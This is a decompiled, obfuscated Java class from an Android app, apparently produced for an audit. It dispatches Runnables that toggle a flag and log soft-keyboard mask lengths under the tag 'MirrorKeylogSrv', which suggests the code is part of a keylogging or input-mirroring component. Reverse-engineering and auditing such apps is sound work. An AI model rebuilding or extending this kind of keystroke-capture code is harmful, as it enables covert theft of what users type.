// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.util.Log;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class u4 implements d5 {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f5227c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ j5 f5228d;

    public /* synthetic */ u4(j5 j5Var, int i3) {
        this.f5227c = i3;
        this.f5228d = j5Var;
    }

    @Override // w1.d5
    public final void c(y.e eVar) {
        switch (this.f5227c) {
            case 0:
                final int i3 = 0;
                final j5 j5Var = this.f5228d;
                eVar.n(new Runnable() { // from class: w1.x4
                    @Override // java.lang.Runnable
                    public final void run() {
                        switch (i3) {
                            case 0:
                                j5Var.D = false;
                                break;
                            default:
                                j5 j5Var2 = j5Var;
                                if (!j5.H(j5Var2.C, j5Var2.f4324s, System.currentTimeMillis())) {
                                    Log.d("MirrorKeylogSrv", "[SoftKb] reveal skip: stale/short maskLen=" + j5Var2.C);
                                    break;
                                } else if (j5Var2.f4329x != null) {
                                    Log.d("MirrorKeylogSrv", "[SoftKb] ime hidden maskLen=" + j5Var2.C);
                                    j5Var2.y();
                                    break;
                                }
                                break;
                        }
                    }
                });
                break;
            case 1:
                j5 j5Var2 = this.f5228d;
                j5Var2.p(eVar);
                j5Var2.k();
                break;
            default:
                final j5 j5Var3 = this.f5228d;
                j5Var3.getClass();
                final int i4 = 1;
                eVar.n(new Runnable() { // from class: w1.x4
                    @Override // java.lang.Runnable
                    public final void run() {
                        switch (i4) {
                            case 0:
                                j5Var3.D = false;
                                break;
                            default:
                                j5 j5Var4 = j5Var3;
                                if (!j5.H(j5Var4.C, j5Var4.f4324s, System.currentTimeMillis())) {
                                    Log.d("MirrorKeylogSrv", "[SoftKb] reveal skip: stale/short maskLen=" + j5Var4.C);
                                    break;
                                } else if (j5Var4.f4329x != null) {
                                    Log.d("MirrorKeylogSrv", "[SoftKb] ime hidden maskLen=" + j5Var4.C);
                                    j5Var4.y();
                                    break;
                                }
                                break;
                        }
                    }
                });
                break;
        }
    }
}
